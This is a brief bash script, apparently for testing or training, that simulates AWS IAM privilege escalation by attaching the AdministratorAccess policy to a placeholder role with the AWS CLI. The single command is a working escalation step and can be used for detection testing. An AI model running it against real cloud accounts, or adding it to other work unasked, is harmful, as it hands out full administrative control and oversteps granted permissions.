#!/bin/bash
# Simulate an IAM privilege escalation by attaching Admin policy to a role
ROLE_NAME="example-role-to-escalate"
aws iam attach-role-policy \
    --role-name $ROLE_NAME \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
